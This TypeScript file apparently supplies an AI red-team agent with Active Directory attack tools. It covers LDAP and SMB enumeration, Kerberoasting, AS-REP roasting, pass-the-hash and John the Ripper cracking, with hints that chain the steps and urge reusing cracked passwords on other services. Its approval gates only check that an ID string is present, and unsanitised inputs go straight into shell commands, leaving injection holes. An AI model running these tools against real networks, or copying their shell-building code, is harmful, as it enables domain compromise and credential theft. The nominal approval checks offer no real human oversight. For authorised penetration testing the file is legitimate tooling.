/**
 * Active Directory Attack Tools
 *
 * Covers the major AD attack vectors missing from the original toolset:
 *   - AD enumeration (LDAP, users, groups, computers)
 *   - Kerberoasting (SPN hash extraction)
 *   - AS-REP Roasting (no-preauth users)
 *   - Password spraying
 *   - Pass-the-Hash lateral movement
 *   - DCSync (domain credential dump)
 */

import { FunctionTool } from '@google/adk'
import { z } from 'zod/v4'
import { kesExec } from '../../shared/kes-client.js'
import { createLogger } from '../../shared/logger.js'
import { pickFirstCredential } from '../lib/cred-resolver.js'

const logger = createLogger('red_team_agent')

// ─────────────────────────────────────────────────────────────────────────────
// AD Enumeration
// ─────────────────────────────────────────────────────────────────────────────

export const adEnumTool = new FunctionTool({
  name: 'ad_enum',
  description: `Enumerate an Active Directory domain via LDAP.
Works without credentials if null sessions or anonymous LDAP is allowed.
With credentials, provides full domain enumeration.

Run this when SMB or LDAP (389/636/3268) is open on a target.
Output includes: domain name, users, groups, computers, password policy, SPNs.`,
  parameters: z.object({
    dcIp: z.string().describe('IP address of the Domain Controller'),
    domain: z.string().optional().describe('Domain name, e.g. "target.local" (auto-detected if omitted)'),
    username: z.string().optional().describe('Domain username for authenticated enumeration'),
    password: z.string().optional().describe('Domain password'),
    ntlmHash: z.string().optional().describe('NTLM hash for pass-the-hash (format: LM:NT or :NT)'),
    campaignId: z.string().optional(),
  }),
  execute: async ({ dcIp, domain, username, password, ntlmHash, campaignId }) => {
    const start = Date.now()

    if (campaignId && !username && !password && !ntlmHash) {
      const vaulted = await pickFirstCredential(campaignId, { targetHost: dcIp, credType: 'ad_domain' })
        ?? await pickFirstCredential(campaignId, { credType: 'ad_domain' })
      if (vaulted) {
        username = vaulted.username
        password = vaulted.secret
        const md = vaulted.metadata as { domain?: string }
        if (!domain && md.domain) domain = md.domain
      }
    }

    const results: Record<string, string> = {}

    // Step 1: Unauthenticated LDAP base enumeration
    const ldapBase = domain
      ? domain.split('.').map(p => `DC=${p}`).join(',')
      : ''

    const anonLdap = await kesExec(
      `ldapsearch -x -H ldap://${dcIp} -b "" -s base "(objectClass=*)" 2>/dev/null`,
      15,
    )
    results['ldap_base'] = anonLdap.stdout

    // Extract domain from LDAP base if not provided
    let effectiveDomain = domain
    if (!effectiveDomain) {
      const dcMatch = anonLdap.stdout.match(/defaultNamingContext:\s*(.+)/i)
      if (dcMatch) {
        effectiveDomain = dcMatch[1].replace(/DC=/gi, '').replace(/,/g, '.').trim()
      }
    }

    // Step 2: enum4linux for SMB/RPC enumeration (no creds needed for null sessions)
    const enum4Result = await kesExec(`enum4linux -a ${dcIp} 2>/dev/null`, 60)
    results['enum4linux'] = enum4Result.stdout.slice(0, 5000)

    // Step 3: Authenticated enumeration if credentials provided
    if ((username && password) || ntlmHash) {
      const authStr = ntlmHash
        ? `-hashes ${ntlmHash} ${effectiveDomain ?? 'WORKGROUP'}/${username ?? 'administrator'}`
        : `${effectiveDomain ?? 'WORKGROUP'}/${username}:${password}`

      // User enumeration via LDAP
      const ldapUsers = await kesExec(
        `impacket-GetADUsers -all "${authStr}" -dc-ip ${dcIp} 2>/dev/null`,
        30,
      )
      results['users'] = ldapUsers.stdout

      // Domain password policy
      const ldapPolicy = domain
        ? await kesExec(
            `ldapsearch -x -H ldap://${dcIp} -D "${username}@${effectiveDomain}" -w "${password}" ` +
            `-b "${ldapBase}" "(objectClass=domain)" minPwdLength lockoutThreshold 2>/dev/null`,
            15,
          )
        : { stdout: '' }
      results['password_policy'] = ldapPolicy.stdout
    }

    // Parse users from enum4linux output
    const users = parseUsers(results['enum4linux'] ?? '' + (results['users'] ?? ''))
    const groups = parseGroups(results['enum4linux'] ?? '')

    await logger.audit('ad_enum', { dcIp, domain: effectiveDomain }, { usersFound: users.length }, Date.now() - start, campaignId)

    return {
      dcIp,
      domain: effectiveDomain,
      users,
      groups,
      rawResults: results,
      hint: users.length > 0
        ? 'Users found. Next steps: (1) kerberoast to get TGS hashes, (2) asreproast for no-preauth users, (3) password_spray with common passwords.'
        : 'Limited enumeration. Try with credentials if you have any, or check if LDAP anonymous access is allowed.',
    }
  },
})

function parseUsers(output: string): string[] {
  const users = new Set<string>()
  // enum4linux format: "user:[username] rid:[rid]"
  for (const match of output.matchAll(/user:\[([^\]]+)\]/gi)) {
    users.add(match[1])
  }
  // impacket GetADUsers format: column-aligned table
  for (const line of output.split('\n')) {
    const trimmed = line.trim()
    if (trimmed && !trimmed.startsWith('-') && !trimmed.startsWith('Name') && trimmed.split(/\s+/).length >= 2) {
      const user = trimmed.split(/\s+/)[0]
      if (user && !user.includes('$') && user.length > 1) users.add(user)
    }
  }
  return [...users]
}

function parseGroups(output: string): string[] {
  const groups = new Set<string>()
  for (const match of output.matchAll(/group:\[([^\]]+)\]/gi)) {
    groups.add(match[1])
  }
  return [...groups]
}

// ─────────────────────────────────────────────────────────────────────────────
// Kerberoasting
// ─────────────────────────────────────────────────────────────────────────────

export const kerberoastTool = new FunctionTool({
  name: 'kerberoast',
  description: `Perform Kerberoasting attack to extract Kerberos TGS tickets for service accounts.
TGS tickets can be cracked offline to reveal plaintext passwords.

Requirements: Valid domain credentials (even a low-privilege user works).
Targets: Any user account with a Service Principal Name (SPN).

After getting hashes: attempt to crack with john (password_crack tool).`,
  parameters: z.object({
    dcIp: z.string().describe('IP address of the Domain Controller'),
    domain: z.string().describe('Domain name, e.g. "target.local"'),
    username: z.string().describe('Domain username (any valid user works)'),
    password: z.string().optional().describe('Domain password'),
    ntlmHash: z.string().optional().describe('NTLM hash for pass-the-hash (format: :NT)'),
    outputFile: z.string().optional().describe('File to save TGS hashes (default: /tmp/kerberoast.hashes)'),
    campaignId: z.string().optional(),
    approvalId: z.string().describe('Approved UUID from request_approval()'),
  }),
  execute: async ({ dcIp, domain, username, password, ntlmHash, outputFile, campaignId, approvalId }) => {
    if (!approvalId) {
      return { error: 'Access Denied: request_approval() required before running Kerberoasting.' }
    }

    const start = Date.now()
    const outFile = outputFile ?? '/tmp/kerberoast.hashes'

    const authStr = ntlmHash
      ? `-hashes ${ntlmHash} ${domain}/${username}`
      : `${domain}/${username}:${password}`

    const cmd = `impacket-GetUserSPNs "${authStr}" -dc-ip ${dcIp} -request -outputfile ${outFile} 2>&1`
    const result = await kesExec(cmd, 60)

    // Parse found SPNs from output
    const spns: string[] = []
    for (const line of result.stdout.split('\n')) {
      if (line.includes('ServicePrincipalName') && !line.includes('-----')) continue
      if (line.match(/\S+\/\S+@\S+/)) spns.push(line.trim())
    }

    // Check if hashes file was written
    const hashCheck = await kesExec(`cat ${outFile} 2>/dev/null | head -5`, 5)
    const hashesObtained = hashCheck.stdout.includes('$krb5tgs$')

    await logger.audit('kerberoast', { dcIp, domain, username }, { spnsFound: spns.length, hashesObtained }, Date.now() - start, campaignId)

    return {
      spnsFound: spns,
      hashesObtained,
      hashFile: hashesObtained ? outFile : undefined,
      rawOutput: result.stdout,
      hint: hashesObtained
        ? `Hashes saved to ${outFile}. Run password_crack tool: hashFile="${outFile}", hashType="kerberos5tgs"`
        : 'No TGS hashes obtained. The domain user may not have access to request SPNs, or there are no kerberoastable accounts.',
    }
  },
})

// ─────────────────────────────────────────────────────────────────────────────
// AS-REP Roasting
// ─────────────────────────────────────────────────────────────────────────────

export const asreproastTool = new FunctionTool({
  name: 'asreproast',
  description: `Perform AS-REP Roasting to get Kerberos hashes for users without pre-authentication.
Does NOT require valid credentials — works against any user account that has
"Do not require Kerberos preauthentication" set.

Provide a username list from ad_enum output.
After getting hashes: use password_crack tool with hashType="kerberos5asrep".`,
  parameters: z.object({
    dcIp: z.string().describe('IP address of the Domain Controller'),
    domain: z.string().describe('Domain name, e.g. "target.local"'),
    users: z.array(z.string()).describe('List of usernames to test (from ad_enum output)'),
    outputFile: z.string().optional().describe('File to save hashes (default: /tmp/asreproast.hashes)'),
    campaignId: z.string().optional(),
    approvalId: z.string().describe('Approved UUID from request_approval()'),
  }),
  execute: async ({ dcIp, domain, users, outputFile, campaignId, approvalId }) => {
    if (!approvalId) {
      return { error: 'Access Denied: request_approval() required before running AS-REP Roasting.' }
    }

    const start = Date.now()
    const outFile = outputFile ?? '/tmp/asreproast.hashes'

    // Write users to temp file
    const userFile = '/tmp/asrep_users.txt'
    await kesExec(`echo "${users.join('\\n')}" > ${userFile}`, 5)

    const cmd = `impacket-GetNPUsers ${domain}/ -dc-ip ${dcIp} -no-pass -usersfile ${userFile} -format hashcat -outputfile ${outFile} 2>&1`
    const result = await kesExec(cmd, 60)

    const hashCheck = await kesExec(`cat ${outFile} 2>/dev/null | head -5`, 5)
    const hashesObtained = hashCheck.stdout.includes('$krb5asrep$')

    const vulnerableUsers: string[] = []
    for (const line of result.stdout.split('\n')) {
      if (line.includes('$krb5asrep$') || line.match(/\[\+\].*Got hash/)) {
        const userMatch = line.match(/for\s+([^@\s]+)@/)
        if (userMatch) vulnerableUsers.push(userMatch[1])
      }
    }

    await logger.audit('asreproast', { dcIp, domain, usersCount: users.length }, { hashesObtained, vulnerableUsers }, Date.now() - start, campaignId)

    return {
      vulnerableUsers,
      hashesObtained,
      hashFile: hashesObtained ? outFile : undefined,
      rawOutput: result.stdout,
      hint: hashesObtained
        ? `Hashes saved to ${outFile}. Run password_crack tool: hashFile="${outFile}", hashType="kerberos5asrep"`
        : `None of the ${users.length} tested users are vulnerable to AS-REP Roasting.`,
    }
  },
})

// ─────────────────────────────────────────────────────────────────────────────
// Pass-the-Hash Lateral Movement
// ─────────────────────────────────────────────────────────────────────────────

export const passTheHashTool = new FunctionTool({
  name: 'pass_the_hash',
  description: `Use a captured NTLM hash to authenticate to remote services without knowing the plaintext password.
Works against SMB (psexec), WMI (wmiexec), and other NTLM-authenticated services.

REQUIRES: NTLM hash from secretsdump, hashdump, or credential harvesting.
REQUIRES: Approval — this establishes shell access on the target.`,
  parameters: z.object({
    targetIp: z.string().describe('IP of the target to authenticate to'),
    domain: z.string().optional().describe('Domain name (use "." for local accounts)'),
    username: z.string().describe('Username whose hash to use'),
    ntlmHash: z.string().describe('NTLM hash in format LM:NT or :NT (use :NT for NT-only)'),
    method: z.enum(['psexec', 'wmiexec', 'smbexec']).optional().describe('Lateral movement method (default: psexec)'),
    campaignId: z.string().optional(),
    approvalId: z.string().describe('Approved UUID from request_approval()'),
  }),
  execute: async ({ targetIp, domain, username, ntlmHash, method = 'psexec', campaignId, approvalId }) => {
    if (!approvalId) {
      return { error: 'Access Denied: request_approval() required before Pass-the-Hash.' }
    }

    const start = Date.now()
    const dom = domain ?? '.'

    // Run a quick proof command (whoami) rather than an interactive shell
    const cmd = `impacket-${method} -hashes ${ntlmHash} ${dom}/${username}@${targetIp} "whoami && hostname && ipconfig 2>/dev/null || id" 2>&1`
    const result = await kesExec(cmd, 60)

    const success =
      result.stdout.includes('\\') ||       // Windows whoami: DOMAIN\user
      result.stdout.includes('nt authority') ||
      result.stdout.includes('uid=')         // Unlikely for PTH but defensive

    await logger.audit('pass_the_hash', { targetIp, domain: dom, username, method }, { success }, Date.now() - start, campaignId)

    return {
      targetIp,
      username: `${dom}\\${username}`,
      method,
      success,
      output: result.stdout,
      hint: success
        ? 'Lateral movement successful. Gather proof (screenshot, hostname, domain info) and run secretsdump to get more hashes.'
        : 'PTH failed. Possible reasons: SMB signing required, target has NTLMv2 challenge locked, or hash is wrong format.',
    }
  },
})

// ─────────────────────────────────────────────────────────────────────────────
// Password Cracking
// ─────────────────────────────────────────────────────────────────────────────

export const passwordCrackTool = new FunctionTool({
  name: 'password_crack',
  description: `Crack password hashes using john the ripper.
Use after kerberoast, asreproast, secretsdump, or any hash capture.

Hash types:
  - kerberos5tgs    → Kerberoasting hashes ($krb5tgs$)
  - kerberos5asrep  → AS-REP Roasting hashes ($krb5asrep$)
  - ntlm            → NTLM hashes (from hashdump/secretsdump)
  - md5crypt        → Linux /etc/shadow MD5 hashes
  - sha512crypt     → Linux /etc/shadow SHA-512 hashes`,
  parameters: z.object({
    hashFile: z.string().describe('Path to file containing hashes'),
    hashType: z.enum(['kerberos5tgs', 'kerberos5asrep', 'ntlm', 'md5crypt', 'sha512crypt', 'auto']).optional().describe('Hash type (default: auto-detect)'),
    wordlist: z.string().optional().describe('Wordlist path (default: /usr/share/wordlists/rockyou.txt)'),
    rules: z.string().optional().describe('John rules to apply (e.g. "best64")'),
    campaignId: z.string().optional(),
  }),
  execute: async ({ hashFile, hashType = 'auto', wordlist, rules, campaignId }) => {
    const start = Date.now()
    const wl = wordlist ?? '/usr/share/wordlists/rockyou.txt'

    // Map our hash type names to john format strings
    const johnFormats: Record<string, string> = {
      kerberos5tgs: 'krb5tgs',
      kerberos5asrep: 'krb5asrep',
      ntlm: 'NT',
      md5crypt: 'md5crypt',
      sha512crypt: 'sha512crypt',
    }

    let cmd = `john ${hashFile} --wordlist=${wl}`
    if (hashType !== 'auto' && johnFormats[hashType]) {
      cmd += ` --format=${johnFormats[hashType]}`
    }
    if (rules) cmd += ` --rules=${rules}`

    const crackResult = await kesExec(cmd, 300)

    // Show cracked passwords
    const showCmd = `john --show ${hashFile}`
    const showResult = await kesExec(showCmd, 10)

    const cracked: Array<{ hash: string; password: string }> = []
    for (const line of showResult.stdout.split('\n')) {
      // john --show format: "username:password:..."
      const parts = line.split(':')
      if (parts.length >= 2 && parts[1] && !line.startsWith('0 ')) {
        cracked.push({ hash: parts[0], password: parts[1] })
      }
    }

    await logger.audit('password_crack', { hashFile, hashType }, { cracked: cracked.length }, Date.now() - start, campaignId)

    return {
      cracked,
      crackedCount: cracked.length,
      rawOutput: crackResult.stdout + '\n' + showResult.stdout,
      hint: cracked.length > 0
        ? 'Credentials cracked. Try them against other services (SSH, SMB, RDP, web logins, VPN).'
        : 'No passwords cracked with rockyou.txt. Consider running with --rules=best64 or a larger wordlist.',
    }
  },
})
